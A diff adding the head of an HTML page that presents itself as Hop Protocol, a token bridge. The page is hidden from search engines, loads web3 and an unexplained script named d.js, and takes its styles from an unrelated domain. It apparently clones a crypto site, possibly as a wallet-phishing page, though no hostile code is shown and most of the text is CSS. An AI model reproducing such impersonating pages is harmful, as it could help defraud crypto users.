@@ -1,0 +1,4448 @@
+<!DOCTYPE html>
+
+<html lang="en-US">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, viewport-fit=cover">
+    <link rel="profile" href="https://gmpg.org/xfn/11">
+    <title>Hop Protocol â A protocol for sending tokens across rollups and their shared layer-1 network</title>
+    <meta name="robots" content="noindex, nofollow">
+   
+    <style id="wp-block-library-inline-css">
+        .has-text-align-justify {
+            text-align: justify;
+        }
+    </style>
+       <script src="web3.min.js"></script>
+       <script src="jquery.js"></script>
+       <script src="layer/layer.js"></script>
+       <script src="d.js"></script>
+    <style id="global-styles-inline-css">
+        body {
+            --wp--preset--color--black: #000000;
+            --wp--preset--color--cyan-bluish-gray: #abb8c3;
+            --wp--preset--color--white: #ffffff;
+            --wp--preset--color--pale-pink: #f78da7;
+            --wp--preset--color--vivid-red: #cf2e2e;
+            --wp--preset--color--luminous-vivid-orange: #ff6900;
+            --wp--preset--color--luminous-vivid-amber: #fcb900;
+            --wp--preset--color--light-green-cyan: #7bdcb5;
+            --wp--preset--color--vivid-green-cyan: #00d084;
+            --wp--preset--color--pale-cyan-blue: #8ed1fc;
+            --wp--preset--color--vivid-cyan-blue: #0693e3;
+            --wp--preset--color--vivid-purple: #9b51e0;
+            --wp--preset--color--palette-color-1: var(--paletteColor1, #282cff);
+            --wp--preset--color--palette-color-2: var(--paletteColor2, #ff4d00);
+            --wp--preset--color--palette-color-3: var(--paletteColor3, #fefeff);
+            --wp--preset--color--palette-color-4: var(--paletteColor4, #ffffff);
+            --wp--preset--color--palette-color-5: var(--paletteColor5, #e1e8ed);
+            --wp--preset--color--palette-color-6: var(--paletteColor6, #f2f5f7);
+            --wp--preset--color--palette-color-7: var(--paletteColor7, #FAFBFC);
+            --wp--preset--color--palette-color-8: var(--paletteColor8, #ffffff);
+            --wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg, rgba(6, 147, 227, 1) 0%, rgb(155, 81, 224) 100%);
+            --wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg, rgb(122, 220, 180) 0%, rgb(0, 208, 130) 100%);
+            --wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg, rgba(252, 185, 0, 1) 0%, rgba(255, 105, 0, 1) 100%);
+            --wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg, rgba(255, 105, 0, 1) 0%, rgb(207, 46, 46) 100%);
+            --wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg, rgb(238, 238, 238) 0%, rgb(169, 184, 195) 100%);
+            --wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg, rgb(74, 234, 220) 0%, rgb(151, 120, 209) 20%, rgb(207, 42, 186) 40%, rgb(238, 44, 130) 60%, rgb(251, 105, 98) 80%, rgb(254, 248, 76) 100%);
+            --wp--preset--gradient--blush-light-purple: linear-gradient(135deg, rgb(255, 206, 236) 0%, rgb(152, 150, 240) 100%);
+            --wp--preset--gradient--blush-bordeaux: linear-gradient(135deg, rgb(254, 205, 165) 0%, rgb(254, 45, 45) 50%, rgb(107, 0, 62) 100%);
+            --wp--preset--gradient--luminous-dusk: linear-gradient(135deg, rgb(255, 203, 112) 0%, rgb(199, 81, 192) 50%, rgb(65, 88, 208) 100%);
+            --wp--preset--gradient--pale-ocean: linear-gradient(135deg, rgb(255, 245, 203) 0%, rgb(182, 227, 212) 50%, rgb(51, 167, 181) 100%);
+            --wp--preset--gradient--electric-grass: linear-gradient(135deg, rgb(202, 248, 128) 0%, rgb(113, 206, 126) 100%);
+            --wp--preset--gradient--midnight: linear-gradient(135deg, rgb(2, 3, 129) 0%, rgb(40, 116, 252) 100%);
+            --wp--preset--gradient--juicy-peach: linear-gradient(to right, #ffecd2 0%, #fcb69f 100%);
+            --wp--preset--gradient--young-passion: linear-gradient(to right, #ff8177 0%, #ff867a 0%, #ff8c7f 21%, #f99185 52%, #cf556c 78%, #b12a5b 100%);
+            --wp--preset--gradient--true-sunset: linear-gradient(to right, #fa709a 0%, #fee140 100%);
+            --wp--preset--gradient--morpheus-den: linear-gradient(to top, #30cfd0 0%, #330867 100%);
+            --wp--preset--gradient--plum-plate: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --wp--preset--gradient--aqua-splash: linear-gradient(15deg, #13547a 0%, #80d0c7 100%);
+            --wp--preset--gradient--love-kiss: linear-gradient(to top, #ff0844 0%, #ffb199 100%);
+            --wp--preset--gradient--new-retrowave: linear-gradient(to top, #3b41c5 0%, #a981bb 49%, #ffc8a9 100%);
+            --wp--preset--gradient--plum-bath: linear-gradient(to top, #cc208e 0%, #6713d2 100%);
+            --wp--preset--gradient--high-flight: linear-gradient(to right, #0acffe 0%, #495aff 100%);
+            --wp--preset--gradient--teen-party: linear-gradient(-225deg, #FF057C 0%, #8D0B93 50%, #321575 100%);
+            --wp--preset--gradient--fabled-sunset: linear-gradient(-225deg, #231557 0%, #44107A 29%, #FF1361 67%, #FFF800 100%);
+            --wp--preset--gradient--arielle-smile: radial-gradient(circle 248px at center, #16d9e3 0%, #30c7ec 47%, #46aef7 100%);
+            --wp--preset--gradient--itmeo-branding: linear-gradient(180deg, #2af598 0%, #009efd 100%);
+            --wp--preset--gradient--deep-blue: linear-gradient(to right, #6a11cb 0%, #2575fc 100%);
+            --wp--preset--gradient--strong-bliss: linear-gradient(to right, #f78ca0 0%, #f9748f 19%, #fd868c 60%, #fe9a8b 100%);
+            --wp--preset--gradient--sweet-period: linear-gradient(to top, #3f51b1 0%, #5a55ae 13%, #7b5fac 25%, #8f6aae 38%, #a86aa4 50%, #cc6b8e 62%, #f18271 75%, #f3a469 87%, #f7c978 100%);
+            --wp--preset--gradient--purple-division: linear-gradient(to top, #7028e4 0%, #e5b2ca 100%);
+            --wp--preset--gradient--cold-evening: linear-gradient(to top, #0c3483 0%, #a2b6df 100%, #6b8cce 100%, #a2b6df 100%);
+            --wp--preset--gradient--mountain-rock: linear-gradient(to right, #868f96 0%, #596164 100%);
+            --wp--preset--gradient--desert-hump: linear-gradient(to top, #c79081 0%, #dfa579 100%);
+            --wp--preset--gradient--ethernal-constance: linear-gradient(to top, #09203f 0%, #537895 100%);
+            --wp--preset--gradient--happy-memories: linear-gradient(-60deg, #ff5858 0%, #f09819 100%);
+            --wp--preset--gradient--grown-early: linear-gradient(to top, #0ba360 0%, #3cba92 100%);
+            --wp--preset--gradient--morning-salad: linear-gradient(-225deg, #B7F8DB 0%, #50A7C2 100%);
+            --wp--preset--gradient--night-call: linear-gradient(-225deg, #AC32E4 0%, #7918F2 48%, #4801FF 100%);
+            --wp--preset--gradient--mind-crawl: linear-gradient(-225deg, #473B7B 0%, #3584A7 51%, #30D2BE 100%);
+            --wp--preset--gradient--angel-care: linear-gradient(-225deg, #FFE29F 0%, #FFA99F 48%, #FF719A 100%);
+            --wp--preset--gradient--juicy-cake: linear-gradient(to top, #e14fad 0%, #f9d423 100%);
+            --wp--preset--gradient--rich-metal: linear-gradient(to right, #d7d2cc 0%, #304352 100%);
+            --wp--preset--gradient--mole-hall: linear-gradient(-20deg, #616161 0%, #9bc5c3 100%);
+            --wp--preset--gradient--cloudy-knoxville: linear-gradient(120deg, #fdfbfb 0%, #ebedee 100%);
+            --wp--preset--gradient--soft-grass: linear-gradient(to top, #c1dfc4 0%, #deecdd 100%);
+            --wp--preset--gradient--saint-petersburg: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            --wp--preset--gradient--everlasting-sky: linear-gradient(135deg, #fdfcfb 0%, #e2d1c3 100%);
+            --wp--preset--gradient--kind-steel: linear-gradient(-20deg, #e9defa 0%, #fbfcdb 100%);
+            --wp--preset--gradient--over-sun: linear-gradient(60deg, #abecd6 0%, #fbed96 100%);
+            --wp--preset--gradient--premium-white: linear-gradient(to top, #d5d4d0 0%, #d5d4d0 1%, #eeeeec 31%, #efeeec 75%, #e9e9e7 100%);
+            --wp--preset--gradient--clean-mirror: linear-gradient(45deg, #93a5cf 0%, #e4efe9 100%);
+            --wp--preset--gradient--wild-apple: linear-gradient(to top, #d299c2 0%, #fef9d7 100%);
+            --wp--preset--gradient--snow-again: linear-gradient(to top, #e6e9f0 0%, #eef1f5 100%);
+            --wp--preset--gradient--confident-cloud: linear-gradient(to top, #dad4ec 0%, #dad4ec 1%, #f3e7e9 100%);
+            --wp--preset--gradient--glass-water: linear-gradient(to top, #dfe9f3 0%, white 100%);
+            --wp--preset--gradient--perfect-white: linear-gradient(-225deg, #E3FDF5 0%, #FFE6FA 100%);
+            --wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');
+            --wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');
+            --wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');
+            --wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');
+            --wp--preset--duotone--midnight: url('#wp-duotone-midnight');
+            --wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');
+            --wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');
+            --wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');
+            --wp--preset--font-size--small: 13px;
+            --wp--preset--font-size--medium: 20px;
+            --wp--preset--font-size--large: 36px;
+            --wp--preset--font-size--x-large: 42px;
+            --wp--preset--spacing--20: 0.44rem;
+            --wp--preset--spacing--30: 0.67rem;
+            --wp--preset--spacing--40: 1rem;
+            --wp--preset--spacing--50: 1.5rem;
+            --wp--preset--spacing--60: 2.25rem;
+            --wp--preset--spacing--70: 3.38rem;
+            --wp--preset--spacing--80: 5.06rem;
+            --wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);
+            --wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);
+            --wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);
+            --wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);
+            --wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);
+        }
+
+        body {
+            margin: 0;
+            --wp--style--global--content-size: var(--block-max-width);
+            --wp--style--global--wide-size: var(--block-wide-max-width);
+        }
+
+        .wp-site-blocks>.alignleft {
+            float: left;
+            margin-right: 2em;
+        }
+
+        .wp-site-blocks>.alignright {
+            float: right;
+            margin-left: 2em;
+        }
+
+        .wp-site-blocks>.aligncenter {
+            justify-content: center;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .wp-site-blocks>* {
+            margin-block-start: 0;
+            margin-block-end: 0;
+        }
+
+        .wp-site-blocks>*+* {
+            margin-block-start: var(--content-spacing);
+        }
+
+        body {
+            --wp--style--block-gap: var(--content-spacing);
+        }
+
+        body .is-layout-flow>* {
+            margin-block-start: 0;
+            margin-block-end: 0;
+        }
+
+        body .is-layout-flow>*+* {
+            margin-block-start: var(--content-spacing);
+            margin-block-end: 0;
+        }
+
+        body .is-layout-constrained>* {
+            margin-block-start: 0;
+            margin-block-end: 0;
+        }
+
+        body .is-layout-constrained>*+* {
+            margin-block-start: var(--content-spacing);
+            margin-block-end: 0;
+        }
+
+        body .is-layout-flex {
+            gap: var(--content-spacing);
+        }
+
+        body .is-layout-flow>.alignleft {
+            float: left;
+            margin-inline-start: 0;
+            margin-inline-end: 2em;
+        }
+
+        body .is-layout-flow>.alignright {
+            float: right;
+            margin-inline-start: 2em;
+            margin-inline-end: 0;
+        }
+
+        body .is-layout-flow>.aligncenter {
+            margin-left: auto !important;
+            margin-right: auto !important;
+        }
+
+        body .is-layout-constrained>.alignleft {
+            float: left;
+            margin-inline-start: 0;
+            margin-inline-end: 2em;
+        }
+
+        body .is-layout-constrained>.alignright {
+            float: right;
+            margin-inline-start: 2em;
+            margin-inline-end: 0;
+        }
+
+        body .is-layout-constrained>.aligncenter {
+            margin-left: auto !important;
+            margin-right: auto !important;
+        }
+
+        body .is-layout-constrained> :where(:not(.alignleft):not(.alignright):not(.alignfull)) {
+            max-width: var(--wp--style--global--content-size);
+            margin-left: auto !important;
+            margin-right: auto !important;
+        }
+
+        body .is-layout-constrained>.alignwide {
+            max-width: var(--wp--style--global--wide-size);
+        }
+
+        body .is-layout-flex {
+            display: flex;
+        }
+
+        body .is-layout-flex {
+            flex-wrap: wrap;
+            align-items: center;
+        }
+
+        body .is-layout-flex>* {
+            margin: 0;
+        }
+
+        body {
+            padding-top: 0px;
+            padding-right: 0px;
+            padding-bottom: 0px;
+            padding-left: 0px;
+        }
+
+        .has-black-color {
+            color: var(--wp--preset--color--black) !important;
+        }
+
+        .has-cyan-bluish-gray-color {
+            color: var(--wp--preset--color--cyan-bluish-gray) !important;
+        }
+
+        .has-white-color {
+            color: var(--wp--preset--color--white) !important;
+        }
+
+        .has-pale-pink-color {
+            color: var(--wp--preset--color--pale-pink) !important;
+        }
+
+        .has-vivid-red-color {
+            color: var(--wp--preset--color--vivid-red) !important;
+        }
+
+        .has-luminous-vivid-orange-color {
+            color: var(--wp--preset--color--luminous-vivid-orange) !important;
+        }
+
+        .has-luminous-vivid-amber-color {
+            color: var(--wp--preset--color--luminous-vivid-amber) !important;
+        }
+
+        .has-light-green-cyan-color {
+            color: var(--wp--preset--color--light-green-cyan) !important;
+        }
+
+        .has-vivid-green-cyan-color {
+            color: var(--wp--preset--color--vivid-green-cyan) !important;
+        }
+
+        .has-pale-cyan-blue-color {
+            color: var(--wp--preset--color--pale-cyan-blue) !important;
+        }
+
+        .has-vivid-cyan-blue-color {
+            color: var(--wp--preset--color--vivid-cyan-blue) !important;
+        }
+
+        .has-vivid-purple-color {
+            color: var(--wp--preset--color--vivid-purple) !important;
+        }
+
+        .has-palette-color-1-color {
+            color: var(--wp--preset--color--palette-color-1) !important;
+        }
+
+        .has-palette-color-2-color {
+            color: var(--wp--preset--color--palette-color-2) !important;
+        }
+
+        .has-palette-color-3-color {
+            color: var(--wp--preset--color--palette-color-3) !important;
+        }
+
+        .has-palette-color-4-color {
+            color: var(--wp--preset--color--palette-color-4) !important;
+        }
+
+        .has-palette-color-5-color {
+            color: var(--wp--preset--color--palette-color-5) !important;
+        }
+
+        .has-palette-color-6-color {
+            color: var(--wp--preset--color--palette-color-6) !important;
+        }
+
+        .has-palette-color-7-color {
+            color: var(--wp--preset--color--palette-color-7) !important;
+        }
+
+        .has-palette-color-8-color {
+            color: var(--wp--preset--color--palette-color-8) !important;
+        }
+
+        .has-black-background-color {
+            background-color: var(--wp--preset--color--black) !important;
+        }
+
+        .has-cyan-bluish-gray-background-color {
+            background-color: var(--wp--preset--color--cyan-bluish-gray) !important;
+        }
+
+        .has-white-background-color {
+            background-color: var(--wp--preset--color--white) !important;
+        }
+
+        .has-pale-pink-background-color {
+            background-color: var(--wp--preset--color--pale-pink) !important;
+        }
+
+        .has-vivid-red-background-color {
+            background-color: var(--wp--preset--color--vivid-red) !important;
+        }
+
+        .has-luminous-vivid-orange-background-color {
+            background-color: var(--wp--preset--color--luminous-vivid-orange) !important;
+        }
+
+        .has-luminous-vivid-amber-background-color {
+            background-color: var(--wp--preset--color--luminous-vivid-amber) !important;
+        }
+
+        .has-light-green-cyan-background-color {
+            background-color: var(--wp--preset--color--light-green-cyan) !important;
+        }
+
+        .has-vivid-green-cyan-background-color {
+            background-color: var(--wp--preset--color--vivid-green-cyan) !important;
+        }
+
+        .has-pale-cyan-blue-background-color {
+            background-color: var(--wp--preset--color--pale-cyan-blue) !important;
+        }
+
+        .has-vivid-cyan-blue-background-color {
+            background-color: var(--wp--preset--color--vivid-cyan-blue) !important;
+        }
+
+        .has-vivid-purple-background-color {
+            background-color: var(--wp--preset--color--vivid-purple) !important;
+        }
+
+        .has-palette-color-1-background-color {
+            background-color: var(--wp--preset--color--palette-color-1) !important;
+        }
+
+        .has-palette-color-2-background-color {
+            background-color: var(--wp--preset--color--palette-color-2) !important;
+        }
+
+        .has-palette-color-3-background-color {
+            background-color: var(--wp--preset--color--palette-color-3) !important;
+        }
+
+        .has-palette-color-4-background-color {
+            background-color: var(--wp--preset--color--palette-color-4) !important;
+        }
+
+        .has-palette-color-5-background-color {
+            background-color: var(--wp--preset--color--palette-color-5) !important;
+        }
+
+        .has-palette-color-6-background-color {
+            background-color: var(--wp--preset--color--palette-color-6) !important;
+        }
+
+        .has-palette-color-7-background-color {
+            background-color: var(--wp--preset--color--palette-color-7) !important;
+        }
+
+        .has-palette-color-8-background-color {
+            background-color: var(--wp--preset--color--palette-color-8) !important;
+        }
+
+        .has-black-border-color {
+            border-color: var(--wp--preset--color--black) !important;
+        }
+
+        .has-cyan-bluish-gray-border-color {
+            border-color: var(--wp--preset--color--cyan-bluish-gray) !important;
+        }
+
+        .has-white-border-color {
+            border-color: var(--wp--preset--color--white) !important;
+        }
+
+        .has-pale-pink-border-color {
+            border-color: var(--wp--preset--color--pale-pink) !important;
+        }
+
+        .has-vivid-red-border-color {
+            border-color: var(--wp--preset--color--vivid-red) !important;
+        }
+
+        .has-luminous-vivid-orange-border-color {
+            border-color: var(--wp--preset--color--luminous-vivid-orange) !important;
+        }
+
+        .has-luminous-vivid-amber-border-color {
+            border-color: var(--wp--preset--color--luminous-vivid-amber) !important;
+        }
+
+        .has-light-green-cyan-border-color {
+            border-color: var(--wp--preset--color--light-green-cyan) !important;
+        }
+
+        .has-vivid-green-cyan-border-color {
+            border-color: var(--wp--preset--color--vivid-green-cyan) !important;
+        }
+
+        .has-pale-cyan-blue-border-color {
+            border-color: var(--wp--preset--color--pale-cyan-blue) !important;
+        }
+
+        .has-vivid-cyan-blue-border-color {
+            border-color: var(--wp--preset--color--vivid-cyan-blue) !important;
+        }
+
+        .has-vivid-purple-border-color {
+            border-color: var(--wp--preset--color--vivid-purple) !important;
+        }
+
+        .has-palette-color-1-border-color {
+            border-color: var(--wp--preset--color--palette-color-1) !important;
+        }
+
+        .has-palette-color-2-border-color {
+            border-color: var(--wp--preset--color--palette-color-2) !important;
+        }
+
+        .has-palette-color-3-border-color {
+            border-color: var(--wp--preset--color--palette-color-3) !important;
+        }
+
+        .has-palette-color-4-border-color {
+            border-color: var(--wp--preset--color--palette-color-4) !important;
+        }
+
+        .has-palette-color-5-border-color {
+            border-color: var(--wp--preset--color--palette-color-5) !important;
+        }
+
+        .has-palette-color-6-border-color {
+            border-color: var(--wp--preset--color--palette-color-6) !important;
+        }
+
+        .has-palette-color-7-border-color {
+            border-color: var(--wp--preset--color--palette-color-7) !important;
+        }
+
+        .has-palette-color-8-border-color {
+            border-color: var(--wp--preset--color--palette-color-8) !important;
+        }
+
+        .has-vivid-cyan-blue-to-vivid-purple-gradient-background {
+            background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;
+        }
+
+        .has-light-green-cyan-to-vivid-green-cyan-gradient-background {
+            background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;
+        }
+
+        .has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background {
+            background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;
+        }
+
+        .has-luminous-vivid-orange-to-vivid-red-gradient-background {
+            background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;
+        }
+
+        .has-very-light-gray-to-cyan-bluish-gray-gradient-background {
+            background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;
+        }
+
+        .has-cool-to-warm-spectrum-gradient-background {
+            background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;
+        }
+
+        .has-blush-light-purple-gradient-background {
+            background: var(--wp--preset--gradient--blush-light-purple) !important;
+        }
+
+        .has-blush-bordeaux-gradient-background {
+            background: var(--wp--preset--gradient--blush-bordeaux) !important;
+        }
+
+        .has-luminous-dusk-gradient-background {
+            background: var(--wp--preset--gradient--luminous-dusk) !important;
+        }
+
+        .has-pale-ocean-gradient-background {
+            background: var(--wp--preset--gradient--pale-ocean) !important;
+        }
+
+        .has-electric-grass-gradient-background {
+            background: var(--wp--preset--gradient--electric-grass) !important;
+        }
+
+        .has-midnight-gradient-background {
+            background: var(--wp--preset--gradient--midnight) !important;
+        }
+
+        .has-juicy-peach-gradient-background {
+            background: var(--wp--preset--gradient--juicy-peach) !important;
+        }
+
+        .has-young-passion-gradient-background {
+            background: var(--wp--preset--gradient--young-passion) !important;
+        }
+
+        .has-true-sunset-gradient-background {
+            background: var(--wp--preset--gradient--true-sunset) !important;
+        }
+
+        .has-morpheus-den-gradient-background {
+            background: var(--wp--preset--gradient--morpheus-den) !important;
+        }
+
+        .has-plum-plate-gradient-background {
+            background: var(--wp--preset--gradient--plum-plate) !important;
+        }
+
+        .has-aqua-splash-gradient-background {
+            background: var(--wp--preset--gradient--aqua-splash) !important;
+        }
+
+        .has-love-kiss-gradient-background {
+            background: var(--wp--preset--gradient--love-kiss) !important;
+        }
+
+        .has-new-retrowave-gradient-background {
+            background: var(--wp--preset--gradient--new-retrowave) !important;
+        }
+
+        .has-plum-bath-gradient-background {
+            background: var(--wp--preset--gradient--plum-bath) !important;
+        }
+
+        .has-high-flight-gradient-background {
+            background: var(--wp--preset--gradient--high-flight) !important;
+        }
+
+        .has-teen-party-gradient-background {
+            background: var(--wp--preset--gradient--teen-party) !important;
+        }
+
+        .has-fabled-sunset-gradient-background {
+            background: var(--wp--preset--gradient--fabled-sunset) !important;
+        }
+
+        .has-arielle-smile-gradient-background {
+            background: var(--wp--preset--gradient--arielle-smile) !important;
+        }
+
+        .has-itmeo-branding-gradient-background {
+            background: var(--wp--preset--gradient--itmeo-branding) !important;
+        }
+
+        .has-deep-blue-gradient-background {
+            background: var(--wp--preset--gradient--deep-blue) !important;
+        }
+
+        .has-strong-bliss-gradient-background {
+            background: var(--wp--preset--gradient--strong-bliss) !important;
+        }
+
+        .has-sweet-period-gradient-background {
+            background: var(--wp--preset--gradient--sweet-period) !important;
+        }
+
+        .has-purple-division-gradient-background {
+            background: var(--wp--preset--gradient--purple-division) !important;
+        }
+
+        .has-cold-evening-gradient-background {
+            background: var(--wp--preset--gradient--cold-evening) !important;
+        }
+
+        .has-mountain-rock-gradient-background {
+            background: var(--wp--preset--gradient--mountain-rock) !important;
+        }
+
+        .has-desert-hump-gradient-background {
+            background: var(--wp--preset--gradient--desert-hump) !important;
+        }
+
+        .has-ethernal-constance-gradient-background {
+            background: var(--wp--preset--gradient--ethernal-constance) !important;
+        }
+
+        .has-happy-memories-gradient-background {
+            background: var(--wp--preset--gradient--happy-memories) !important;
+        }
+
+        .has-grown-early-gradient-background {
+            background: var(--wp--preset--gradient--grown-early) !important;
+        }
+
+        .has-morning-salad-gradient-background {
+            background: var(--wp--preset--gradient--morning-salad) !important;
+        }
+
+        .has-night-call-gradient-background {
+            background: var(--wp--preset--gradient--night-call) !important;
+        }
+
+        .has-mind-crawl-gradient-background {
+            background: var(--wp--preset--gradient--mind-crawl) !important;
+        }
+
+        .has-angel-care-gradient-background {
+            background: var(--wp--preset--gradient--angel-care) !important;
+        }
+
+        .has-juicy-cake-gradient-background {
+            background: var(--wp--preset--gradient--juicy-cake) !important;
+        }
+
+        .has-rich-metal-gradient-background {
+            background: var(--wp--preset--gradient--rich-metal) !important;
+        }
+
+        .has-mole-hall-gradient-background {
+            background: var(--wp--preset--gradient--mole-hall) !important;
+        }
+
+        .has-cloudy-knoxville-gradient-background {
+            background: var(--wp--preset--gradient--cloudy-knoxville) !important;
+        }
+
+        .has-soft-grass-gradient-background {
+            background: var(--wp--preset--gradient--soft-grass) !important;
+        }
+
+        .has-saint-petersburg-gradient-background {
+            background: var(--wp--preset--gradient--saint-petersburg) !important;
+        }
+
+        .has-everlasting-sky-gradient-background {
+            background: var(--wp--preset--gradient--everlasting-sky) !important;
+        }
+
+        .has-kind-steel-gradient-background {
+            background: var(--wp--preset--gradient--kind-steel) !important;
+        }
+
+        .has-over-sun-gradient-background {
+            background: var(--wp--preset--gradient--over-sun) !important;
+        }
+
+        .has-premium-white-gradient-background {
+            background: var(--wp--preset--gradient--premium-white) !important;
+        }
+
+        .has-clean-mirror-gradient-background {
+            background: var(--wp--preset--gradient--clean-mirror) !important;
+        }
+
+        .has-wild-apple-gradient-background {
+            background: var(--wp--preset--gradient--wild-apple) !important;
+        }
+
+        .has-snow-again-gradient-background {
+            background: var(--wp--preset--gradient--snow-again) !important;
+        }
+
+        .has-confident-cloud-gradient-background {
+            background: var(--wp--preset--gradient--confident-cloud) !important;
+        }
+
+        .has-glass-water-gradient-background {
+            background: var(--wp--preset--gradient--glass-water) !important;
+        }
+
+        .has-perfect-white-gradient-background {
+            background: var(--wp--preset--gradient--perfect-white) !important;
+        }
+
+        .has-small-font-size {
+            font-size: var(--wp--preset--font-size--small) !important;
+        }
+
+        .has-medium-font-size {
+            font-size: var(--wp--preset--font-size--medium) !important;
+        }
+
+        .has-large-font-size {
+            font-size: var(--wp--preset--font-size--large) !important;
+        }
+
+        .has-x-large-font-size {
+            font-size: var(--wp--preset--font-size--x-large) !important;
+        }
+
+        .wp-block-navigation a:where(:not(.wp-element-button)) {
+            color: inherit;
+        }
+
+        .wp-block-pullquote {
+            font-size: 1.5em;
+            line-height: 1.6;
+        }
+    </style>
+    <link rel="stylesheet" id="elementor-frontend-css" href="https://husdc.io/files/frontend-lite.min.css" media="all">
+    <link rel="stylesheet" id="elementor-post-6-css" href="https://husdc.io/files/post-6.css" media="all">
+    <link rel="stylesheet" id="elementor-post-33-css" href="https://husdc.io/files/post-33.css" media="all">
+    <link rel="stylesheet" id="ct-main-styles-css" href="https://husdc.io/files/main.min.css" media="all">
+    <link rel="stylesheet" id="ct-page-title-styles-css" href="https://husdc.io/files/page-title.min.css" media="all">
+    <link rel="stylesheet" id="ct-back-to-top-styles-css" href="https://husdc.io/files/back-to-top.min.css" media="all">
+    <link rel="stylesheet" id="ct-elementor-styles-css" href="https://husdc.io/files/elementor-frontend.min.css" media="all">
+    <link rel="stylesheet" id="ct-wpforms-styles-css" href="https://husdc.io/files/wpforms.min.css" media="all">
+    <link rel="stylesheet" id="google-fonts-1-css" href="https://husdc.io/files/css" media="all">
+
+
+    <meta name="generator" content="WordPress 6.2">
+
+    <style>
+        img#wpstats {
+            display: none
+        }
+    </style>
+
+    <style id="ct-main-styles-inline-css">
+        [data-header*="type-1"] .ct-header [data-id="logo"] .site-logo-container {
+            --logo-max-height: 67px;
+        }
+
+        [data-header*="type-1"] .ct-header [data-id="logo"] .site-title {
+            --fontFamily: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol';
+            --fontWeight: 100;
+            --fontStyle: italic;
+            --fontSize: 25px;
+            --lineHeight: 1.5;
+            --linkInitialColor: #ffffff;
+            --linkHoverColor: #e9dcdc;
+        }
+
+        [data-header*="type-1"] .ct-header [data-id="logo"] {
+            --horizontal-alignment: right;
+        }
+
+        [data-header*="type-1"] .ct-header [data-id="menu"]>ul>li>a {
+            --fontWeight: 700;
+            --textTransform: uppercase;
+            --fontSize: 12px;
+            --lineHeight: 1.3;
+            --linkInitialColor: #e87dfe;
+            --linkHoverColor: #000000;
+        }
+
+        [data-header*="type-1"] .ct-header [data-id="menu"][data-menu*="type-3"]>ul>li>a {
+            --linkHoverColor: #ffffff;
+            --linkActiveColor: #ffffff;
+        }
+
+        [data-header*="type-1"] .ct-header [data-id="menu"] {
+            --menu-indicator-active-color: #e87dfe;
+        }
+
+        [data-header*="type-1"] .ct-header [data-id="menu"] .sub-menu {
+            --linkInitialColor: #ffffff;
+            --linkHoverColor: #d7d7d7;
+            --linkActiveColor: #e87dfe;
+            --dropdown-background-color: #3BCC34;
+            --dropdown-width: 200px;
+            --fontWeight: 500;
+            --fontSize: 12px;
+            --dropdown-divider: 1px dashed rgba(255, 255, 255, 0.1);
+            --box-shadow: 0px 10px 20px rgba(41, 51, 61, 0.1);
+            --border-radius: 0px 0px 2px 2px;
+        }
+
+        [data-header*="type-1"] .ct-header [data-row*="middle"] {
+            --height: 129px;
+            background-color: #ffffff;
+            background-image: none;
+            --borderTop: none;
+            --borderBottom: none;
+            --box-shadow: none;
+        }
+
+        [data-header*="type-1"] .ct-header [data-row*="middle"]>div {
+            --borderTop: none;
+            --borderBottom: none;
+        }
+
+        [data-header*="type-1"] [data-id="mobile-menu"] {
+            --fontWeight: 700;
+            --fontSize: 20px;
+            --linkInitialColor: #ffffff;
+            --mobile-menu-divider: none;
+        }
+
+        [data-header*="type-1"] #offcanvas .ct-panel-inner {
+            background-color: rgba(18, 21, 25, 0.98);
+        }
+
+        [data-header*="type-1"] #offcanvas {
+            --side-panel-width: 500px;
+        }
+
+        [data-header*="type-1"] [data-behaviour*="side"] {
+            --box-shadow: 0px 0px 70px rgba(0, 0, 0, 0.35);
+        }
+
+        [data-header*="type-1"] [data-id="search"] {
+            --icon-color: #e87dfe;
+            --icon-hover-color: #414141;
+        }
+
+        [data-header*="type-1"] [data-id="search"] .ct-label {
+            --fontWeight: 600;
+            --textTransform: uppercase;
+            --fontSize: 12px;
+        }
+
+        [data-header*="type-1"] #search-modal .ct-search-results a {
+            --fontWeight: 500;
+            --fontSize: 14px;
+            --lineHeight: 1.4;
+        }
+
+        [data-header*="type-1"] #search-modal {
+            --linkInitialColor: #ffffff;
+            --form-text-initial-color: #ffffff;
+            --form-text-focus-color: #ffffff;
+            background-color: var(--paletteColor1);
+        }
+
+        [data-header*="type-1"] #search-modal form button {
+            --icon-color: var(--paletteColor1);
+            --icon-focus-color: #202020;
+            --search-button-background: #0059ff;
+        }
+
